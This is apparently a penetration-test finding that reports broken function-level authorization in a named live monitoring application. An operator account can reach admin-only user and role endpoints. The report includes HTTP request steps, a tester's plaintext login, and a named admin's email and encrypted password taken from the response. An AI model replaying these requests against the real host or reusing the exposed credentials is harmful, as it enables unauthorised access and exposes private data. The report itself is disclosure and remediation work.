# Broken Function Level Authorization - Operator Role Can Access Admin-Only User Management and Role Endpoints

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-02-17 19:12:26 UTC

## Description

## Summary
The MonitorPro application at https://almaviva.monitorpro.ai/ suffers from Broken Function Level Authorization (BFLA) allowing users with the "operator" role to access administrative endpoints that should be restricted to admin users only. This enables lower-privileged users to view sensitive user data including encrypted passwords and system role configurations.

## Vulnerability Details

**Vulnerability Type:** Broken Function Level Authorization (BFLA) / OWASP API5:2023
**CVSS v3.1 Score:** 7.5 (High)
**CVSS Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

### Affected Endpoints

1. **GET /api/users/V2/maintenance/all** - User management endpoint that returns all user data including encrypted passwords
2. **GET /api/roles** - Role definitions endpoint that exposes the entire permission structure

### Affected Roles
- **operator** role (lower privilege) can access admin-only data
- Tested with user: jchacon@intrustsecurity.co

## Proof of Concept

### Step 1: Login as Operator
```http
POST /api/users/login HTTP/1.1
Host: almaviva.monitorpro.ai
Content-Type: application/json

{"email":"jchacon@intrustsecurity.co","password":"test123"}
```

**Response confirms operator role:**
```json
{
  "user": {
    "role": {
      "name": "operator"
    }
  }
}
```

### Step 2: Access User Management Endpoint (Should be Admin-Only)
```http
GET /api/users/V2/maintenance/all?page=1&pageSize=10 HTTP/1.1
Host: almaviva.monitorpro.ai
Authorization: Bearer [operator_jwt_token]
```

**Response (HTTP 200 - VULNERABLE):**
```json
{
  "total": 5,
  "total_pages": 1,
  "current_page": 1,
  "data": [
    {
      "_id": "69738ea41303ec0014f7e14b",
      "username": "LUIS MOZO",
      "email": "lmozo@almaviva.com.co",
      "password": "U2FsdGVkX19TVLMeXmUp9NieWRfr18a86yh0oPUgttE=",
      "role": {"name": "admin"}
    },
    ...
  ]
}
```

The operator can see:
- 5 user accounts (including admin users)
- Encrypted passwords (CryptoJS AES format)
- User IDs, emails, and role assignments

### Step 3: Access Roles Endpoint (Should be Admin-Only)
```http
GET /api/roles HTTP/1.1
Host: almaviva.monitorpro.ai
Authorization: Bearer [operator_jwt_token]
```

**Response (HTTP 200 - VULNERABLE):**
```json
[
  {"_id": "...", "name": "operator", "permissions": [13 items]},
  {"_id": "...", "name": "supervisor", "permissions": [19 items]},
  {"_id": "...", "name": "admin", "permissions": [53 items]},
  {"_id": "...", "name": "despachador", "permissions": [...]}
]
```

The operator can view the complete role hierarchy and permission structure.

## Impact

1. **Vertical Privilege Escalation:** Lower-privileged operator users can access administrative data and functionality
2. **Sensitive Data Exposure:** Encrypted passwords of all users (including admins) are exposed to operators
3. **Information Disclosure:** Complete role and permission structure is visible to all authenticated users
4. **Credential Theft Risk:** If the encryption key is compromised, all user passwords could be decrypted
5. **Reconnaissance Aid:** Attackers with operator access can map the entire permission system
6. **Compliance Violation:** Violates principle of least privilege and data protection requirements

## Root Cause
The API endpoints lack proper role-based access control (RBAC) enforcement. The backend accepts requests from any authenticated user without verifying if the user's role has permission to access the requested resource.

## Remediation

### Immediate Actions
1. Implement server-side RBAC checks on all administrative endpoints
2. Restrict `/api/users/V2/maintenance/all` to admin role only
3. Restrict `/api/roles` to admin role only or remove sensitive permission details

### Long-term Recommendations
1. Implement centralized authorization middleware that enforces role-based permissions
2. Apply deny-by-default policy - explicitly grant access rather than implicitly allow
3. Audit all API endpoints for proper authorization enforcement
4. Never expose encrypted/hashed passwords via any API endpoint
5. Implement API endpoint documentation with required permission levels
6. Add authorization unit tests for all protected endpoints

## References
- OWASP API Security Top 10 2023 - API5: Broken Function Level Authorization
- CWE-285: Improper Authorization
- CWE-863: Incorrect Authorization
